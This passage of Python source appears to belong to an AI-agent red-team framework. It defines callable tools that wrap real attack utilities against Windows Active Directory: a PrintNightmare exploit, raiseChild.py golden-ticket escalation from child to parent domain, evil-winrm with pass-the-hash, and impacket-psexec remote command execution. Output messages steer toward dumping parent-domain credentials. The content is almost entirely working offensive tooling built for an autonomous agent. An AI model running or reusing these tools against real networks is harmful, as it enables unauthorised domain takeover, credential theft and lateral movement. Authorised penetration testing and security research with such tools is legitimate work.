            logger.info(f"[*] Exploiting PrintNightmare on {target}")
            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if "success" in result.lower() or "executed" in result.lower():
                logger.info("[+] PrintNightmare exploitation successful!")

            return result

        except Exception as e:
            return f"PrintNightmare failed: {e}"


class TrustAttackTools(Toolset):
    """Tools for Active Directory trust relationship attacks.

    These tools enable escalation from child to parent domains
    and cross-forest attacks.
    """

    state: RedTeamState | None = None

    def set_state(self, state: RedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def raise_child(
        self,
        child_domain: str,
        username: str,
        password: str,
        target_domain: str | None = None,
    ) -> str:
        """
        Escalate from child domain to parent domain (raiseChild.py).

        Automates the child-to-parent domain escalation using the krbtgt hash
        from the child domain to forge a golden ticket with Enterprise Admin SID.

        Use after obtaining krbtgt hash from a child domain via secretsdump.

        Args:
            child_domain: Child domain where you have krbtgt (e.g., "child.domain.local")
            username: Username with access in child domain
            password: Password for authentication
            target_domain: Parent domain to escalate to (auto-detected if omitted)

        Returns:
            Escalation result with tickets and hashes

        Example:
            >>> raise_child("child.domain.local", "administrator", "pass")
        """
        cmd = [
            "raiseChild.py",
            f"{child_domain}/{username}:{password}",
        ]

        if target_domain:
            cmd.extend(["-target-domain", target_domain])

        try:
            logger.info(f"[*] Escalating from {child_domain} to parent domain")
            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=300)

            result = stdout + "\n" + (stderr or "")

            if "enterprise admin" in result.lower() or "golden ticket" in result.lower():
                logger.info("[+] Child-to-parent escalation successful!")
                result = (
                    "🚨 DOMAIN ESCALATION SUCCESSFUL!\n"
                    "→ Enterprise Admin access obtained\n"
                    "→ Use secretsdump on parent domain DCs\n\n" + result
                )

            return result

        except Exception as e:
            return f"raiseChild failed: {e}"


class LateralMovementTools(Toolset):
    """Tools for lateral movement and remote access.

    These tools enable interactive sessions and command execution
    on compromised systems.
    """

    state: RedTeamState | None = None

    def set_state(self, state: RedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def evil_winrm(
        self,
        target: str,
        username: str,
        password: str | None = None,
        hash: str | None = None,
        domain: str | None = None,
        command: str | None = None,
    ) -> str:
        """
        Execute command or establish WinRM session (evil-winrm).

        WinRM (Windows Remote Management) enables remote PowerShell access.
        Use for lateral movement after obtaining credentials.

        Args:
            target: Target machine IP
            username: Username for authentication
            password: Password (optional if using hash)
            hash: NTLM hash for pass-the-hash (optional if using password)
            domain: Domain for authentication (optional)
            command: Command to execute (if None, would start interactive session)

        Returns:
            Command output or session status

        Example:
            >>> evil_winrm("192.168.56.22", "admin", password="pass")  # pragma: allowlist secret
            >>> evil_winrm("192.168.56.22", "admin", hash="aad3b435...")
        """
        cmd = ["evil-winrm", "-i", target, "-u", username]

        if password:
            cmd.extend(["-p", password])
        elif hash:
            cmd.extend(["-H", hash])
        else:
            return "[!] Error: Either password or hash must be provided"

        # Execute a command and return (non-interactive)
        if command:
            cmd.extend(["-c", command])
        else:
            # Default to whoami for verification
            cmd.extend(["-c", "whoami && hostname && ipconfig"])

        try:
            logger.info(f"[*] Connecting to {target} via WinRM")
            stdout, stderr, returncode = _run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if (
                returncode == 0
                or "nt authority\\system" in result.lower()
                or username.lower() in result.lower()
            ):
                logger.info(f"[+] WinRM session to {target} successful!")

            return result

        except Exception as e:
            return f"evil-winrm failed: {e}"

    @dn.tool_method
    def psexec(
        self,
        target: str,
        username: str,
        password: str | None = None,
        hash: str | None = None,
        domain: str | None = None,
        command: str = "cmd.exe",
    ) -> str:
        """
        Execute command via PsExec (impacket-psexec).

        PsExec enables remote command execution via SMB. Requires admin access.
        More reliable than WinRM in some environments.

        Args:
            target: Target machine IP
            username: Username with admin access
            password: Password (optional if using hash)
            hash: NTLM hash for pass-the-hash (optional)
            domain: Domain for authentication
            command: Command to execute (default: cmd.exe)

        Returns:
            Command output

        Example:
            >>> psexec("192.168.56.22", "admin", password="pass", command="whoami")  # pragma: allowlist secret
        """
        target_string = f"{domain}/{username}" if domain else username
        target_string += f":{password}@{target}" if password else f"@{target}"

        cmd = ["impacket-psexec", target_string]

        if hash:
            cmd.extend(["-hashes", f":{hash}"])

        cmd.extend(["-c", command])

        try:
            logger.info(f"[*] Executing via PsExec on {target}")
            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)
            return stdout + "\n" + (stderr or "")

        except Exception as e:
            return f"PsExec failed: {e}"
